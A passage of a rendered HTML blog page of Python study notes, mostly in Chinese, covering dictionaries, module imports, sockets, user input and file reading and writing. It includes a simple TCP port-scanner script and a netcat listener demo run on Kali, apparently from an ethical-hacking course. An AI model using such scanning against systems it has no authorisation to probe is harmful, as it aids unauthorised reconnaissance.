+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">student[<span class="string">&quot;age&quot;</span>] = <span class="number">21</span>       <span class="comment"># Modifying a value</span></span><br><span class="line">student[<span class="string">&quot;city&quot;</span>] = <span class="string">&quot;London&quot;</span>    <span class="comment"># Adding a new key-value pair</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Dictionary Operations</p>
+<ul>
+<li><p>Length</p>
+<ul>
+<li>len() 函數傳回字典中鍵值對的數量</li>
+</ul>
+</li>
+<li><p>Iteration</p>
+<ul>
+<li>使用循環迭代字典的鍵、值或鍵值對</li>
+</ul>
+</li>
+<li><p>Deletion</p>
+<ul>
+<li>使用 del 關鍵字從字典中刪除鍵值對</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">student = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">&quot;major&quot;</span>: <span class="string">&quot;Computer Science&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(student))          <span class="comment"># Output: 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> student:</span><br><span class="line">    <span class="built_in">print</span>(key, student[key])  <span class="comment"># Output: &quot;name Alice&quot;, &quot;age 20&quot;, &quot;major Computer Science&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> student[<span class="string">&quot;age&quot;</span>]           <span class="comment"># Deleting a key-value pair</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>功能強大的資料結構</p>
+</li>
+<li><p>基於鍵存儲和檢索資料</p>
+</li>
+<li><p>用於組織和操作需要快速有效存取的資料</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#DICTIONARIES - key/value pairs &#123;&#125;</span></span><br><span class="line"></span><br><span class="line">drinks = &#123;<span class="string">&quot;White Russian&quot;</span>: <span class="number">7</span>, <span class="string">&quot;Old Fashion&quot;</span>: <span class="number">10</span>, <span class="string">&quot;Lemon Drop&quot;</span>: <span class="number">8</span>&#125; <span class="comment">#drink is key, price is value</span></span><br><span class="line"><span class="built_in">print</span>(drinks)＃&#123;<span class="string">&#x27;White Russian&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Old Fashion&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;Lemon Drop&#x27;</span>: <span class="number">8</span>&#125;</span><br><span class="line"></span><br><span class="line">employees = &#123;<span class="string">&quot;Finance&quot;</span>: [<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Linda&quot;</span>, <span class="string">&quot;Tina&quot;</span>], <span class="string">&quot;IT&quot;</span>: [<span class="string">&quot;Gene&quot;</span>, <span class="string">&quot;Louise&quot;</span>, <span class="string">&quot;Teddy&quot;</span>], <span class="string">&quot;HR&quot;</span>: [<span class="string">&quot;Jimmy Jr.&quot;</span>, <span class="string">&quot;Mort&quot;</span>]&#125;</span><br><span class="line">employees[<span class="string">&#x27;Legal&#x27;</span>] = [<span class="string">&quot;Mr. Frond&quot;</span>] <span class="comment">#adds new key:value pair</span></span><br><span class="line"><span class="built_in">print</span>(employees)＃&#123;<span class="string">&#x27;Finance&#x27;</span>: [<span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Linda&#x27;</span>, <span class="string">&#x27;Tina&#x27;</span>], <span class="string">&#x27;IT&#x27;</span>: [<span class="string">&#x27;Gene&#x27;</span>, <span class="string">&#x27;Louise&#x27;</span>, <span class="string">&#x27;Teddy&#x27;</span>], <span class="string">&#x27;HR&#x27;</span>: [<span class="string">&#x27;Jimmy Jr.&#x27;</span>, <span class="string">&#x27;Mort&#x27;</span>], <span class="string">&#x27;Legal&#x27;</span>: [<span class="string">&#x27;Mr. Frond&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line">employees.update(&#123;<span class="string">&quot;Sales&quot;</span>: [<span class="string">&quot;Andie&quot;</span>, <span class="string">&quot;Ollie&quot;</span>]&#125;) <span class="comment">#adds new key:value pair</span></span><br><span class="line"><span class="built_in">print</span>(employees)＃&#123;<span class="string">&#x27;Finance&#x27;</span>: [<span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Linda&#x27;</span>, <span class="string">&#x27;Tina&#x27;</span>], <span class="string">&#x27;IT&#x27;</span>: [<span class="string">&#x27;Gene&#x27;</span>, <span class="string">&#x27;Louise&#x27;</span>, <span class="string">&#x27;Teddy&#x27;</span>], <span class="string">&#x27;HR&#x27;</span>: [<span class="string">&#x27;Jimmy Jr.&#x27;</span>, <span class="string">&#x27;Mort&#x27;</span>], <span class="string">&#x27;Legal&#x27;</span>: [<span class="string">&#x27;Mr. Frond&#x27;</span>], <span class="string">&#x27;Sales&#x27;</span>: [<span class="string">&#x27;Andie&#x27;</span>, <span class="string">&#x27;Ollie&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line">drinks[<span class="string">&#x27;White Russian&#x27;</span>] = <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(drinks)＃&#123;<span class="string">&#x27;White Russian&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;Old Fashion&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;Lemon Drop&#x27;</span>: <span class="number">8</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(drinks.get(<span class="string">&quot;White Russian&quot;</span>))＃<span class="number">8</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Importing-Modules"><a href="#Importing-Modules" class="headerlink" title="Importing Modules"></a><strong>Importing Modules</strong></h3><ul>
+<li><p>importing modules 存取和使用駐留在外部 Python 檔案或庫中的程式碼</p>
+</li>
+<li><p>組織和重複使用程式碼的方式</p>
+</li>
+<li><p>Importing Entire Modules</p>
+<ul>
+<li>若要匯入整個模組，請使用 import 關鍵字，後面接著模組名稱</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math<span class="comment">#匯入 math 模組</span></span><br><span class="line"></span><br><span class="line">result = math.sqrt(<span class="number">25</span>)<span class="comment">#使用該模組中的 sqrt() 函數計算 25 的平方根</span></span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># Output: 5.0</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Importing Specific Functions or Variables</p>
+<ul>
+<li>只需要使用模組中的特定函數或變量</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt <span class="comment">#僅從 math 模組匯入 sqrt() 函數</span></span><br><span class="line"></span><br><span class="line">result = sqrt(<span class="number">25</span>)<span class="comment">#可以直接使用它，而無需在其前面添加模組名稱前綴</span></span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># Output: 5.0</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Importing Modules with an Alias</p>
+<ul>
+<li>匯入模組並使用 as 關鍵字為其指定別名</li>
+<li>處理具有長名稱的模組或避免命名衝突時很有幫助</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math <span class="keyword">as</span> m<span class="comment">#數學模組已匯入並指派別名 m</span></span><br><span class="line"></span><br><span class="line">result = m.sqrt(<span class="number">25</span>)</span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># Output: 5.0</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Importing All Functions and Variables</p>
+<ul>
+<li>使用 * 通配符。但是，通常建議僅匯入您需要的內容，以避免命名空間污染</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *  <span class="comment">#數學模組中的所有函數和變數都會直接匯入</span></span><br><span class="line"></span><br><span class="line">result = sqrt(<span class="number">25</span>)<span class="comment">#允許您在使用它們時無需添加模組名稱前綴。</span></span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># Output: 5.0</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#IMPORTING - Importing is important.</span></span><br><span class="line"><span class="keyword">import</span> sys <span class="comment">#system functions and parameters</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime <span class="keyword">as</span> dt <span class="comment">#import with alias </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.version)<span class="comment">#3.11.7 (main, Dec  8 2023, 14:22:46) [GCC 13.2.0]</span></span><br><span class="line"><span class="built_in">print</span>(dt.now())<span class="comment">#2024-02-11 16:56:28.196440</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Sockets"><a href="#Sockets" class="headerlink" title="Sockets"></a>Sockets</h3><ul>
+<li><p>透過網路在電腦之間進行通訊</p>
+</li>
+<li><p>讓程式透過各種網路協定（例如 TCP（傳輸控制協定）和 UDP（用戶資料報協定））建立連線、傳送資料和接收資料</p>
+</li>
+<li><p>建立客戶端-伺服器應用程式、網頁應用程式以及執行各種網路任務</p>
+</li>
+<li><p>透過使用不同協定的網路進行通訊。</p>
+</li>
+<li><p>Socket Creation</p>
+<ul>
+<li>import the <code>socket</code> module</li>
+<li>使用 <code>socket.socket()</code>函數建立 socket 對象</li>
+<li>該函數採用兩個參數<ul>
+<li>the address family (e.g., socket.AF_INET for IPv4)</li>
+<li>socket type (e.g., socket.SOCK_STREAM for TCP or socket.SOCK_DGRAM for UDP)</li>
+</ul>
+</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a TCP socket</span></span><br><span class="line">tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a UDP socket</span></span><br><span class="line">udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Socket Communication</p>
+<ul>
+<li><p>使用各種方法來建立連線、傳送資料和接收資料</p>
+</li>
+<li><p>socket.connect(address)</p>
+<ul>
+<li>建立到遠端位址的連線</li>
+</ul>
+</li>
+<li><p>socket.bind(address)</p>
+<ul>
+<li>將Socket 綁定到特定的位址和連接埠</li>
+</ul>
+</li>
+<li><p>socket.listen(backlog)</p>
+<ul>
+<li>偵聽 TCP socket上的傳入連線</li>
+</ul>
+</li>
+<li><p>socket.accept()</p>
+<ul>
+<li>接受傳入連線並傳回一個新的 socket 物件以進行通訊</li>
+</ul>
+</li>
+<li><p>socket.send(data)</p>
+<ul>
+<li>透過 socket 傳送資料</li>
+</ul>
+</li>
+<li><p>socket.recv(buffer_size)</p>
+<ul>
+<li>從 socket 接收資料</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a TCP socket</span></span><br><span class="line">server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind the socket to a specific address and port</span></span><br><span class="line">server_address = (<span class="string">&#x27;localhost&#x27;</span>, <span class="number">1234</span>)</span><br><span class="line">server_socket.bind(server_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Listen for incoming connections</span></span><br><span class="line">server_socket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Accept a client connection</span></span><br><span class="line">    client_socket, client_address = server_socket.accept()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Receive and send data</span></span><br><span class="line">    data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    client_socket.send(<span class="string">b&quot;Received: &quot;</span> + data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Close the client socket</span></span><br><span class="line">    client_socket.close()</span><br></pre></td></tr></table></figure></li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#SOCKETS - Sockets can be used to connect two nodes together.  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">7777</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment">#af_inet is ipv4, sock stream is a port</span></span><br><span class="line">s.connect((HOST,PORT))</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nlvp 7777 </span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/python]</span><br><span class="line">└─$ python3 sock.py</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nlvp 7777 </span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">**connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44670** </span><br></pre></td></tr></table></figure>
+<h3 id="Building-a-Port-Scanner"><a href="#Building-a-Port-Scanner" class="headerlink" title="Building a Port Scanner"></a><strong>Building a Port Scanner</strong></h3>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define our target</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">	target = socket.gethostbyname(sys.argv[<span class="number">1</span>]) <span class="comment">#Translate hostname to IPv4</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Invalid amount of arguments.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Syntax: python3 scanner.py&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Add a pretty banner</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scanning target &quot;</span>+target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Time started: &quot;</span>+<span class="built_in">str</span>(datetime.now()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>,<span class="number">85</span>):</span><br><span class="line">		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">		result = s.connect_ex((target,port)) <span class="comment">#returns an error indicator - if port is open it throws a 0, otherwise 1</span></span><br><span class="line">		<span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Port &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(port))</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nExiting program.&quot;</span>)</span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">except</span> socket.gaierror:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Hostname could not be resolved.&quot;</span>)</span><br><span class="line">	sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Could not connect to server.&quot;</span>)</span><br><span class="line">	sys.exit()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="User-Input"><a href="#User-Input" class="headerlink" title="User Input"></a><strong>User Input</strong></h3><ul>
+<li>using the <code>input()</code> function</li>
+<li>與使用者互動並接收輸入</li>
+<li>提示使用者輸入並以字串形式接收輸入</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;Enter your name: &quot;</span>)<span class="comment">#提示使用者輸入姓名</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>)<span class="comment">#顯示訊息「輸入您的姓名：」作為提示。</span></span><br><span class="line"><span class="comment">#使用者可以輸入自己的姓名並按 Enter 鍵</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>input()</code> function always returns the user’s input as a string</li>
+<li>需要將輸入轉換為不同的資料類型（例如整數或浮點數）<ul>
+<li>使用適當的轉換函數，例如 int() 或 float()</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">input</span>(<span class="string">&quot;Enter your age: &quot;</span>)<span class="comment">#輸入作為字串儲存在變數age中</span></span><br><span class="line">age = <span class="built_in">int</span>(age)  <span class="comment"># 若要執行算術計算，請使用 int() 函數將輸入轉換為整數</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You will be &quot;</span> + <span class="built_in">str</span>(age + <span class="number">1</span>) + <span class="string">&quot; next year.&quot;</span>)<span class="comment">#將年齡加 1 並列印結果</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用用戶輸入時，請記住它預設是一個字串</li>
+<li>透過在運行時接受使用者的輸入來使程式具有互動性和動態性</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me a number: &quot;</span>))</span><br><span class="line">o = <span class="built_in">input</span>(<span class="string">&quot;Give me an operator: &quot;</span>)</span><br><span class="line">y = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me yet another number: &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x + y)</span><br><span class="line"><span class="keyword">elif</span> o == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x - y)</span><br><span class="line"><span class="keyword">elif</span> o == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x / y)</span><br><span class="line"><span class="keyword">elif</span> o == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x * y)</span><br><span class="line"><span class="keyword">elif</span> o == <span class="string">&quot;**&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x ** y)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Unknown operator.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Reading-and-Writing-Files"><a href="#Reading-and-Writing-Files" class="headerlink" title="Reading and Writing Files"></a><strong>Reading and Writing Files</strong></h3><ul>
+<li><p>使用檔案物件和內建open()函數提供的各種方法來讀取和寫入檔案</p>
+</li>
+<li><p>Reading Files</p>
+<ul>
+<li>using the <code>open()</code> function以讀取模式開啟文件</li>
+<li>使用 read()、readline() 或 readlines() 等方法來擷取檔案的內容</li>
+<li>read()<ul>
+<li>以字串形式讀取檔案的全部內容</li>
+</ul>
+</li>
+<li>readline()<ul>
+<li>從文件中讀取一行</li>
+</ul>
+</li>
+<li>readlines()<ul>
+<li>從檔案中讀取所有行並將它們作為列表傳回</li>
+</ul>
+</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Open the file in read mode</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the entire content</span></span><br><span class="line">content = file.read()</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read a single line</span></span><br><span class="line">line = file.readline()</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read all lines</span></span><br><span class="line">lines = file.readlines()</span><br><span class="line"><span class="built_in">print</span>(lines)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Close the file</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Writing Files</p>
+<ul>
+<li>using the <code>open()</code> function以寫入模式開啟文件</li>
+<li>使用 write() 方法將內容寫入檔案</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write(content)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>指定內容寫入檔案</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Open the file in write mode</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write content to the file</span></span><br><span class="line">file.write(<span class="string">&quot;Hello, World!\n&quot;</span>)</span><br><span class="line">file.write(<span class="string">&quot;This is a new line.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Close the file</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Appending to Files</p>
+<ul>
+<li>若要將內容追加至現有檔案而不覆寫其現有內容</li>
+<li>使用 open() 函數以追加模式（”a”）開啟該檔案</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Open the file in append mode</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Append content to the file</span></span><br><span class="line">file.write(<span class="string">&quot;\nThis is appended content.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Close the file</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在處理檔案時使用 with 語句。這可以確保即使發生異常也能正確關閉檔案。</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;giveread.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">January</span></span><br><span class="line"><span class="string">February</span></span><br><span class="line"><span class="string">March</span></span><br><span class="line"><span class="string">April</span></span><br><span class="line"><span class="string">May</span></span><br><span class="line"><span class="string">June</span></span><br><span class="line"><span class="string">July</span></span><br><span class="line"><span class="string">August</span></span><br><span class="line"><span class="string">September</span></span><br><span class="line"><span class="string">October</span></span><br><span class="line"><span class="string">November</span></span><br><span class="line"><span class="string">December</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">months = <span class="built_in">open</span>(<span class="string">&#x27;giveread.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months)<span class="comment">#&lt;_io.TextIOWrapper name=&#x27;giveread.txt&#x27; mode=&#x27;r&#x27; encoding=&#x27;UTF-8&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months.mode)<span class="comment">#r</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months.readable())<span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months.read())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">January</span></span><br><span class="line"><span class="string">February</span></span><br><span class="line"><span class="string">March</span></span><br><span class="line"><span class="string">April</span></span><br><span class="line"><span class="string">May</span></span><br><span class="line"><span class="string">June</span></span><br><span class="line"><span class="string">July</span></span><br><span class="line"><span class="string">August</span></span><br><span class="line"><span class="string">September</span></span><br><span class="line"><span class="string">October</span></span><br><span class="line"><span class="string">November</span></span><br><span class="line"><span class="string">December</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">months.seek(<span class="number">0</span>)<span class="comment">#if not add it, the output can&#x27;t see anything</span></span><br><span class="line"><span class="built_in">print</span>(months.readline())<span class="comment">#January</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months.readlines())<span class="comment">#[&#x27;February\n&#x27;, &#x27;March\n&#x27;, &#x27;April\n&#x27;, &#x27;May\n&#x27;, &#x27;June\n&#x27;, &#x27;July\n&#x27;, &#x27;August\n&#x27;, &#x27;September\n&#x27;, &#x27;October\n&#x27;, &#x27;November\n&#x27;, &#x27;December&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">months.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(months.readlines())<span class="comment">#[&#x27;January\n&#x27;, &#x27;February\n&#x27;, &#x27;March\n&#x27;, &#x27;April\n&#x27;, &#x27;May\n&#x27;, &#x27;June\n&#x27;, &#x27;July\n&#x27;, &#x27;August\n&#x27;, &#x27;September\n&#x27;, &#x27;October\n&#x27;, &#x27;November\n&#x27;, &#x27;December&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">months.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> month <span class="keyword">in</span> months:</span><br><span class="line">    <span class="built_in">print</span>(month.strip())</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    January</span></span><br><span class="line"><span class="string">    February</span></span><br><span class="line"><span class="string">    March</span></span><br><span class="line"><span class="string">    April</span></span><br><span class="line"><span class="string">    May</span></span><br><span class="line"><span class="string">    June</span></span><br><span class="line"><span class="string">    July</span></span><br><span class="line"><span class="string">    August</span></span><br><span class="line"><span class="string">    September</span></span><br><span class="line"><span class="string">    October</span></span><br><span class="line"><span class="string">    November</span></span><br><span class="line"><span class="string">    December</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">days = <span class="built_in">open</span>(<span class="string">&#x27;day.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(days.mode)<span class="comment">#w</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(days)<span class="comment">#&lt;_io.TextIOWrapper name=&#x27;day.txt&#x27; mode=&#x27;w&#x27; encoding=&#x27;UTF-8&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">days.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">days.write(<span class="string">&quot;Monday&quot;</span>)</span><br><span class="line">days.write(<span class="string">&quot;\nTuesday&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">out = <span class="built_in">open</span>(<span class="string">&#x27;day.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">days.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(out.readlines())<span class="comment">#[&#x27;Monday\n&#x27;, &#x27;Tuesday&#x27;]</span></span><br><span class="line"></span><br><span class="line">days = <span class="built_in">open</span>(<span class="string">&#x27;day.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">days.write(<span class="string">&quot;\nWednesday&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">out = <span class="built_in">open</span>(<span class="string">&#x27;day.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">days.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(out.readlines())<span class="comment">#[&#x27;Monday\n&#x27;, &#x27;Tuesday\n&#x27;, &#x27;Wednesday&#x27;]</span></span><br><span class="line"></span><br><span class="line">months.close()</span><br></pre></td></tr></table></figure>
+
